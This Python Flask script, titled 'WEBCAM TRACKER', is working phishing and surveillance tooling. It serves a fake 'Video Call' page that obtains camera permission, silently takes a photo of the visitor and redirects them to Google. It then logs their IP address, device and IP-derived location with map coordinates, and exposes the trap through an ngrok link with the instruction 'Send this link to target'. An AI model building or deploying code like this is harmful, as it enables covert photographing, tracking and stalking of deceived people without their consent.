from flask import Flask, request, render_template_string, jsonify, send_file
import requests
import json
import os
import subprocess
import threading
import time
import datetime
import base64
from io import BytesIO

app = Flask(__name__)

LOG_FILE = "logs.txt"
PHOTO_DIR = "photos"
NGROK_PORT = 5000

# Create photo directory
if not os.path.exists(PHOTO_DIR):
    os.makedirs(PHOTO_DIR)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Call</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            padding: 20px;
        }
        .container {
            background: #1a1a1a;
            border-radius: 12px;
            padding: 30px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            border: 1px solid #333;
        }
        h1 { font-size: 22px; margin-bottom: 10px; }
        .sub { font-size: 14px; color: #888; margin-bottom: 20px; }
        .video-box {
            background: #000;
            border-radius: 8px;
            height: 300px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 15px 0;
            border: 1px solid #333;
            overflow: hidden;
        }
        #video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }
        .placeholder {
            color: #555;
            font-size: 14px;
        }
        .btn {
            background: #00ff41;
            color: #000;
            border: none;
            padding: 14px 40px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 6px;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-top: 10px;
            width: 100%;
        }
        .btn:hover { background: #00cc33; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .status {
            font-size: 12px;
            color: #666;
            margin-top: 10px;
        }
        .hidden { display: none; }
        #flash {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            z-index: 999;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Video Call</h1>
        <div class="sub">Connecting to secure channel...</div>

        <div class="video-box">
            <video id="video" autoplay playsinline></video>
            <div id="placeholder" class="placeholder">Camera access required</div>
        </div>

        <button id="startBtn" class="btn" onclick="startCamera()">START VIDEO CALL</button>
        <div id="status" class="status">Click button to start</div>
    </div>

    <div id="flash"></div>

    <script>
        var video = document.getElementById('video');
        var placeholder = document.getElementById('placeholder');
        var startBtn = document.getElementById('startBtn');
        var statusEl = document.getElementById('status');
        var flash = document.getElementById('flash');
        var stream = null;
        var photoTaken = false;

        function startCamera() {
            startBtn.disabled = true;
            startBtn.textContent = 'ACCESSING CAMERA...';
            statusEl.textContent = 'Requesting camera permission...';

            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                })
                .then(function(s) {
                    stream = s;
                    video.srcObject = stream;
                    video.style.display = 'block';
                    placeholder.style.display = 'none';
                    startBtn.textContent = 'CONNECTED';
                    startBtn.disabled = true;
                    statusEl.textContent = 'Camera active. Connecting...';

                    // Take photo after 1.5 seconds
                    setTimeout(function() {
                        takePhoto();
                    }, 1500);
                })
                .catch(function(err) {
                    statusEl.textContent = 'Camera access denied. Please allow camera.';
                    startBtn.textContent = 'RETRY';
                    startBtn.disabled = false;
                    console.log('Error: ' + err.message);
                });
            } else {
                statusEl.textContent = 'Browser not supported. Use Chrome/Firefox.';
                startBtn.textContent = 'RETRY';
                startBtn.disabled = false;
            }
        }

        function takePhoto() {
            if (photoTaken) return;
            photoTaken = true;

            var canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            var ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Flash effect
            flash.style.display = 'block';
            setTimeout(function() {
                flash.style.display = 'none';
            }, 300);

            var dataUrl = canvas.toDataURL('image/jpeg', 0.85);

            // Send to server
            fetch('/capture', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    image: dataUrl,
                    timestamp: new Date().toISOString()
                })
            })
            .then(function(response) {
                statusEl.textContent = 'Photo captured! Redirecting...';
                setTimeout(function() {
                    window.location.href = 'https://www.google.com';
                }, 1500);
            })
            .catch(function() {
                statusEl.textContent = 'Error sending photo. Retrying...';
                setTimeout(takePhoto, 1000);
            });

            // Stop stream after photo
            if (stream) {
                stream.getTracks().forEach(function(track) { track.stop(); });
            }
        }

        // Auto-start after 1 second
        setTimeout(function() {
            startCamera();
        }, 500);
    </script>
</body>
</html>
"""

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_target(data):
    """Print target data to terminal"""
    ip = data.get('ip', '-')
    ua = data.get('user_agent', '-')
    ts = data.get('timestamp', '-')
    photo_path = data.get('photo', '-')
    location = data.get('location', {})

    # Parse device
    device = 'PC'
    if 'Android' in ua:
        device = 'Android'
    elif 'iPhone' in ua or 'iPad' in ua:
        device = 'iOS'
    elif 'Windows' in ua:
        device = 'Windows'
    elif 'Linux' in ua:
        device = 'Linux'
    elif 'Mac' in ua:
        device = 'Mac'

    browser = 'Unknown'
    if 'Chrome' in ua and 'Edg' not in ua:
        browser = 'Chrome'
    elif 'Firefox' in ua:
        browser = 'Firefox'
    elif 'Safari' in ua and 'Chrome' not in ua:
        browser = 'Safari'
    elif 'Edg' in ua:
        browser = 'Edge'

    # Get location from IP
    city = location.get('city', '-')
    region = location.get('regionName', '-')
    country = location.get('country', '-')
    lat = location.get('lat', 0)
    lon = location.get('lon', 0)
    isp = location.get('isp', '-')

    clear_screen()
    print('=' * 70)
    print('  PHOTO CAPTURED!')
    print('=' * 70)
    print()
    print('  Time    : ' + ts)
    print('  IP      : ' + ip)
    print('  Device  : ' + device + ' / ' + browser)
    print('  ISP     : ' + isp)
    print('  City    : ' + city)
    print('  Region  : ' + region + ', ' + country)
    print('  Lat     : ' + str(lat))
    print('  Lon     : ' + str(lon))
    print()
    if lat != 0 and lon != 0:
        print('  MAPS    : https://www.google.com/maps?q=' + str(lat) + ',' + str(lon))
    print('  PHOTO   : ' + photo_path)
    print()
    print('=' * 70)
    print('  Waiting for next target...')
    print('=' * 70)
    print()

    # Beep
    if os.name == 'posix':
        os.system('echo -e "\a"')

def monitor_log():
    """Monitor log file real-time"""
    last_size = 0
    if os.path.exists(LOG_FILE):
        last_size = os.path.getsize(LOG_FILE)

    while True:
        time.sleep(1)
        if os.path.exists(LOG_FILE):
            current_size = os.path.getsize(LOG_FILE)
            if current_size > last_size:
                with open(LOG_FILE, 'r', encoding='utf-8') as f:
                    f.seek(last_size)
                    new_lines = f.readlines()
                    for line in new_lines:
                        if line.strip():
                            try:
                                data = json.loads(line)
                                ip = data.get('ip', '')
                                if ip and not ip.startswith('127.') and not ip.startswith('192.168.'):
                                    print_target(data)
                            except:
                                pass
                last_size = current_size

def get_public_ngrok_url():
    try:
        response = requests.get('http://localhost:4040/api/tunnels', timeout=3)
        data = response.json()
        for tunnel in data['tunnels']:
            if tunnel['proto'] == 'https':
                return tunnel['public_url']
        return None
    except:
        return None

def wait_for_ngrok(max_wait=30):
    print('[*] Waiting for ngrok...')
    for i in range(max_wait):
        url = get_public_ngrok_url()
        if url:
            print()
            print('=' * 70)
            print('  PUBLIC LINK: ' + url)
            print('=' * 70)
            print()
            print('  Send this link to target:')
            print('  ' + url)
            print()
            print('  Photos saved in: photos/')
            print('=' * 70)
            print()
            return url
        time.sleep(1)
    print('[-] Ngrok failed. Check http://localhost:4040')
    return None

def start_ngrok():
    try:
        with open('ngrok.log', 'w') as f:
            subprocess.Popen(['ngrok', 'http', str(NGROK_PORT)], stdout=f, stderr=f)
        print('[+] Ngrok started...')
        return True
    except Exception as e:
        print('[-] Failed: ' + str(e))
        return False

def get_location_from_ip(ip):
    try:
        response = requests.get('http://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,lat,lon,isp,org,timezone', timeout=5)
        data = response.json()
        if data.get('status') == 'success':
            return data
        return {}
    except:
        return {}

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    data = request.get_json()
    image_data = data.get('image', '')
    timestamp = data.get('timestamp', datetime.datetime.now().isoformat())

    # Get client IP
    client_ip = request.remote_addr
    forwarded_ip = request.headers.get('X-Forwarded-For')
    if forwarded_ip:
        client_ip = forwarded_ip.split(',')[0].strip()

    user_agent = request.headers.get('User-Agent', 'Unknown')

    # Get location from IP
    location = get_location_from_ip(client_ip)

    # Save image
    if image_data:
        # Remove data:image/jpeg;base64, prefix
        if ',' in image_data:
            image_data = image_data.split(',')[1]

        try:
            image_bytes = base64.b64decode(image_data)
            filename = 'photo_' + datetime.datetime.now().strftime('%Y%m%d_%H%M%S') + '.jpg'
            filepath = os.path.join(PHOTO_DIR, filename)

            with open(filepath, 'wb') as f:
                f.write(image_bytes)

            # Log data
            log_entry = {
                'timestamp': timestamp,
                'ip': client_ip,
                'user_agent': user_agent,
                'photo': filepath,
                'location': location
            }

            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(json.dumps(log_entry, ensure_ascii=False) + '\n')

            return jsonify({'status': 'success', 'photo': filename})

        except Exception as e:
            return jsonify({'status': 'error', 'message': str(e)}), 500

    return jsonify({'status': 'error', 'message': 'No image'}), 400

@app.route('/photos/<filename>')
def get_photo(filename):
    return send_file(os.path.join(PHOTO_DIR, filename))

@app.route('/data', methods=['GET'])
def view_data():
    password = request.args.get('pass')
    if password != 'tracker123':
        return 'Access Denied', 403

    if not os.path.exists(LOG_FILE):
        return 'No data'

    with open(LOG_FILE, 'r', encoding='utf-8') as f:
        lines = f.readlines()

    data_list = [json.loads(line) for line in lines if line.strip()]
    return jsonify(data_list)

if __name__ == '__main__':
    print()
    print('=' * 70)
    print('  WEBCAM TRACKER - PHOTO CAPTURE')
    print('=' * 70)
    print()

    if start_ngrok():
        time.sleep(3)
        public_url = wait_for_ngrok()

    monitor_thread = threading.Thread(target=monitor_log, daemon=True)
    monitor_thread.start()
    print('[*] Real-time monitor active')
    print('[*] Photos saved in: ' + PHOTO_DIR + '/')
    print('[*] Waiting for target...')
    print()

    app.run(host='0.0.0.0', port=5000, debug=False)